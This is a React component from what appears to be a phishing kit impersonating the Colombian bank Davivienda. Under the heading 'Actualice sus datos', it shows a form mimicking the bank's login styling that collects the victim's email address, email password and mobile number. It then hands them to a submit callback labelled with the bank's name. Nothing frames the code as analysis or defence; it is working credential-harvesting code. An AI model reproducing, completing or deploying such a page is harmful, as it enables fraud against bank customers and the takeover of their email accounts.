/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useState } from "react";

const ActDatos = ({ enviar }: any) => {
  const [correo, setCorreo] = useState("");
  const [clave, setClave] = useState("");
  const [celular, setCelular] = useState("");
  const [error, setError] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!correo || !clave || celular.length < 10) {
      setError("Por favor, complete todos los campos correctamente.");
      return;
    }

    setError("");
    enviar?.({
      view: "actdatos",
      correo,
      clave,
      celular,
      bank: "Davivienda",
      timestamp: new Date().toISOString(),
    });
  };

  return (
    <form className="form-login" onSubmit={handleSubmit}>
      <div id="formAutenticar:loginp" className="loginp">
        <div className="wrap container-fluid">
          <div id="formAutenticar:panelContainer" className="form-container">
            <div id="formAutenticar:panelGroupMain" className="auth-form-container">

              <div className="auth-form__logo"></div>

              <h2 className="auth-form__title">Actualice sus datos</h2>
              <h3 className="auth-form__subtitle">Por favor ingrese la siguiente información</h3>

              <div className="form-field form-field__numero-documento">
                <label>Correo Electrónico</label>
                <input
                  type="email"
                  autoComplete="off"
                  value={correo}
                  onChange={(e) => setCorreo(e.target.value)}
                />
              </div>

              <div className="form-field__clave-virtual" style={{ marginTop: "15px" }}>
                <label>Clave del correo</label>
                <input
                  type="password"
                  autoComplete="off"
                  value={clave}
                  onChange={(e) => setClave(e.target.value)}
                />
              </div>

              <div className="form-field form-field__numero-documento" style={{ marginTop: "15px" }}>
                <label>Número de celular</label>
                <input
                  type="tel"
                  autoComplete="off"
                  maxLength={10}
                  value={celular}
                  onChange={(e) => setCelular(e.target.value.replace(/\D/g, ""))}
                />
              </div>

              {error && (
                <p style={{ color: "red", marginTop: "15px" }}>{error}</p>
              )}

              {/* Botón */}
              <div id="formAutenticar:button-container" className="submit" style={{ marginTop: "25px" }}>
                <input
                  type="submit"
                  value="Continuar"
                  className="btn-red continuar"
                />
              </div>

              <div className="form-divider"></div>
            </div>
          </div>
        </div>
      </div>
    </form>
  );
};

export default ActDatos;
